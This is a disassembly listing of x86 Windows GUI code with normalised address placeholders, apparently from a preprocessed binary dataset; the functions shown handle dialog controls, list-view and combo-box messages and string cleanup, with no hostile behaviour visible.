mov [ esp + 0xc4 ] 0xc
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc4 ] 0xb
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc4 ] 0xa
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc4 ] 0x9
call sub_442148
mov [ esp + 0xc4 ] 0x8
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push 0x0
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x20 ]
lea eax [ esp + 0xb8 ]
lea ecx [ edi + 0x1b0 ]
push eax
call sub_442281
lea ecx [ esp + 0xa8 ]
push ecx
lea ecx [ edi + 0x1c0 ]
call sub_442281
lea edx [ esp + 0xb4 ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xa4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xac ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xb0 ]
lea ecx [ edi + 0x1bc ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push ecx
mov ecx esp
mov [ esp + 0xc ] esp
push rw-data
call sub_4421b6
mov ecx edi
call sub_40d9c0
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xc4 ] 0x7
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xc4 ] 0x6
call sub_442148
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc4 ] 0x5
call sub_442148
lea ecx [ esp + 0xac ]
mov [ esp + 0xc4 ] 0x4
call sub_442148
lea ecx [ esp + 0xa8 ]
mov [ esp + 0xc4 ] 0x3
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xc4 ] 0x2
call sub_442148
mov [ esp + 0xc4 ] 0x1
jmp r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0xc4 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xbc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc0
retn
sub_40dd90
push 0xffffffff
push sub_45e1b9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xac ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0xa8 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0xa4 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0xa0 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x9c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40de40
push 0xffffffff
push sub_45e2e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xbc
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_40e960
push 0x1
mov ecx edi
mov [ esp + 0xd8 ] 0x0
call sub_440b18
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x1c ]
push eax
lea ecx [ edi + 0x5c ]
push edx
mov [ esp + 0xe0 ] 0x8
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xe0 ] 0x9
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x18 ]
mov [ esp + 0xd4 ] 0x8
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x7
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x6
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x5
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x4
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x3
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x2
call sub_442148
mov [ esp + 0xd4 ] 0x1
jmp r-xdata
lea ebp [ edi + 0x1b0 ]
lea ecx [ esp + 0xc8 ]
push ebp
call sub_442281
lea ebx [ edi + 0x1c0 ]
lea ecx [ esp + 0xb8 ]
push ebx
call sub_442281
lea eax [ edi + 0x1b8 ]
lea ecx [ esp + 0xc4 ]
push eax
call sub_442281
lea eax [ edi + 0x1b4 ]
lea ecx [ esp + 0xb4 ]
push eax
call sub_442281
lea eax [ edi + 0x1ac ]
lea ecx [ esp + 0xbc ]
push eax
call sub_442281
lea eax [ edi + 0x1bc ]
lea ecx [ esp + 0xc0 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
lea ecx [ esp + 0x1c ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x10
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0xf
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0xe
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0xd
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0xc
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0xb
call sub_442148
mov [ esp + 0xd4 ] 0xa
jmp r-xdata
lea ecx [ esp + 0x78 ]
call sub_44f0ac
lea ecx [ esp + 0x1c ]
mov [ esp + 0xd4 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xcc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc8
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x1f
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x1e
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x1d
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x1c
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x1b
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x1a
call sub_442148
mov [ esp + 0xd4 ] 0x19
mov eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
lea ecx [ edi + 0x5c ]
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xe0 ] 0x11
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xd4 ] 0x8
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xc8 ]
mov ecx ebp
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
mov ecx ebx
call sub_442281
lea edx [ esp + 0xc4 ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xb4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xbc ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ edi + 0x1bc ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push ecx
mov ecx esp
mov [ esp + 0x1c ] esp
push rw-data
call sub_4421b6
mov ecx edi
call sub_40d9c0
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x18
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x17
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x16
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x15
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x14
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x13
call sub_442148
mov [ esp + 0xd4 ] 0x12
jmp r-xdata
sub_40e340
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45e310
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x28 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x28 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
add esp 0x18
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
push ecx
mov ecx esp
mov [ esp + 0x14 ] esp
push rw-data
call sub_4421b6
mov ecx edi
call sub_40d9c0
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x18
retn
sub_40e450
push 0xffffffff
push sub_45e438
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xbc
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_40e960
push 0x1
mov ecx edi
mov [ esp + 0xd8 ] 0x0
call sub_440b18
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1042
push eax
call [ SendMessageA@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
push 0x0
lea edx [ esp + 0x1c ]
push eax
lea ecx [ edi + 0x5c ]
push edx
mov [ esp + 0xe0 ] 0x8
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xe0 ] 0x9
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x18 ]
mov [ esp + 0xd4 ] 0x8
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x7
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x6
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x5
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x4
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x3
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x2
call sub_442148
mov [ esp + 0xd4 ] 0x1
jmp r-xdata
lea ebp [ edi + 0x1b0 ]
lea ecx [ esp + 0xc8 ]
push ebp
call sub_442281
lea ebx [ edi + 0x1c0 ]
lea ecx [ esp + 0xb8 ]
push ebx
call sub_442281
lea eax [ edi + 0x1b8 ]
lea ecx [ esp + 0xc4 ]
push eax
call sub_442281
lea eax [ edi + 0x1b4 ]
lea ecx [ esp + 0xb4 ]
push eax
call sub_442281
lea eax [ edi + 0x1ac ]
lea ecx [ esp + 0xbc ]
push eax
call sub_442281
lea eax [ edi + 0x1bc ]
lea ecx [ esp + 0xc0 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
lea ecx [ esp + 0x1c ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x10
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0xf
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0xe
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0xd
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0xc
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0xb
call sub_442148
mov [ esp + 0xd4 ] 0xa
jmp r-xdata
lea ecx [ esp + 0x78 ]
call sub_44f0ac
lea ecx [ esp + 0x1c ]
mov [ esp + 0xd4 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0xcc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc8
retn 0x8
mov eax [ esp + 0xe0 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
mov [ eax ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x1f
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x1e
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x1d
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x1c
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x1b
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x1a
call sub_442148
mov [ esp + 0xd4 ] 0x19
mov eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
lea ecx [ edi + 0x5c ]
call sub_43c1f0
mov edx [ eax ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0xe0 ] 0x11
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0xd4 ] 0x8
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0xc8 ]
mov ecx ebp
push eax
call sub_442281
lea ecx [ esp + 0xb8 ]
push ecx
mov ecx ebx
call sub_442281
lea edx [ esp + 0xc4 ]
lea ecx [ edi + 0x1b8 ]
push edx
call sub_442281
lea eax [ esp + 0xb4 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0xbc ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0xc0 ]
lea ecx [ edi + 0x1bc ]
push edx
call sub_442281
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
push ecx
mov ecx esp
mov [ esp + 0x1c ] esp
push rw-data
call sub_4421b6
mov ecx edi
call sub_40d9c0
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0xd4 ] 0x0
call sub_442148
lea ecx [ esp + 0xc8 ]
mov [ esp + 0xd4 ] 0x18
call sub_442148
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xd4 ] 0x17
call sub_442148
lea ecx [ esp + 0xc0 ]
mov [ esp + 0xd4 ] 0x16
call sub_442148
lea ecx [ esp + 0xbc ]
mov [ esp + 0xd4 ] 0x15
call sub_442148
lea ecx [ esp + 0xb8 ]
mov [ esp + 0xd4 ] 0x14
call sub_442148
lea ecx [ esp + 0xb4 ]
mov [ esp + 0xd4 ] 0x13
call sub_442148
mov [ esp + 0xd4 ] 0x12
jmp r-xdata
sub_40e960
push 0xffffffff
push sub_45e4b7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x93
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x98 ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x9c ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0xa0 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0xa4 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0xa8 ] edx
mov eax [ rw-data ]
mov [ esi + 0xac ] eax
push rw-data
mov [ esp + 0x20 ] 0x7
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0xa8 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0xac ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40ea90
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3f6
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3f6
push edi
call sub_449495
lea edx [ esi + 0x9c ]
push edx
push 0x418
push edi
call sub_4493f1
lea eax [ esi + 0xa0 ]
push eax
push 0x3ea
push edi
call sub_4493f1
lea ecx [ esi + 0xa4 ]
push ecx
push 0x3ed
push edi
call sub_4493f1
lea edx [ esi + 0xa8 ]
push edx
push 0x3ec
push edi
call sub_4493f1
add esi 0xac
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_40eb30
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0xac ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0xa0 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0x98 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov eax [ esi + 0xa8 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_40ebc0
push 0xffffffff
push sub_45e50e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x128
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a470
push 0x0
push rw-data
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xcc ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x4 ]
call sub_421900
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x6
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x114 ]
mov [ esp + 0x134 ] 0x1
call sub_442148
lea ecx [ esp + 0x4 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x134
retn
push edi
mov edi [ SendMessageA@IAT ]
mov eax [ esp + 0x118 ]
mov ecx [ esi + 0x78 ]
push eax
push 0x0
push 0x143
push ecx
call edi
mov edx [ esp + 0x8 ]
push 0x1
push 0x1
lea ecx [ esp + 0x10 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd0 ]
test eax eax
je r-xdata
pop edi
sub_40ed20
push 0xffffffff
push sub_45e57c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x114 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x118 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x120 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x124 ] edx
mov eax [ rw-data ]
mov [ esi + 0x128 ] eax
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
mov [ esi + 0x110 ] 0x0
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x128 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40ee50
push 0xffffffff
push sub_45e5de
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x128 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40ef20
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x110 ]
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_424ab5
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x124 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x128
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_40eff0
push 0xffffffff
push sub_45e638
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x83
mov [ esp + 0x14 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0xd4 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebp [ esi + 0xd8 ]
mov [ ebp ] edx
push 0x734
mov [ esp + 0x1c ] 0x4
mov [ esi ] r--data
call sub_441e89
add esp 0x4
mov [ esp + 0x20 ] eax
test eax eax
mov [ esp + 0x18 ] 0x5
je r-xdata
xor eax eax
mov ecx eax
call sub_420330
jmp r-xdata
mov ecx eax
mov [ esp + 0x18 ] 0x4
call sub_420380
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_40f100
push 0xffffffff
push sub_45e67f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0xd8 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f153
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f180
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3e8
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3e8
push edi
call sub_449495
add esi 0xd8
push esi
push 0x3e9
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_40f1f0
push 0xffffffff
push sub_45e6cc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebp
push esi
mov esi ecx
push edi
push 0x0
lea ecx [ esp + 0x14 ]
call sub_41ffa0
mov eax [ rw-data ]
mov [ esp + 0x134 ] 0x0
mov [ esp + 0xc ] eax
push 0x1
mov ecx esi
mov [ esp + 0x138 ] 0x1
call sub_440b18
call sub_45357b
mov ecx [ esi + 0xd8 ]
mov edx [ esi + 0xd4 ]
mov ebp [ eax + 0x4 ]
lea edi [ esi + 0xd8 ]
push ecx
push edx
lea eax [ esp + 0x14 ]
push rw-data
push eax
call sub_43b5cc
mov ecx [ esp + 0x1c ]
add esp 0x10
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xac ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0xc ]
mov [ esp + 0x134 ] 0x0
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x3
call sub_442148
mov [ esp + 0x134 ] 0x2
jmp r-xdata
mov edx [ esp + 0x128 ]
lea ecx [ esp + 0x10 ]
mov [ ebp + 0xc0 ] edx
call sub_421900
mov ecx esi
call sub_43e178
lea ecx [ esp + 0x10 ]
call sub_421900
push 0x0
push 0x0
push rw-data
mov ecx esi
call sub_43fe9c
push rw-data
mov ecx edi
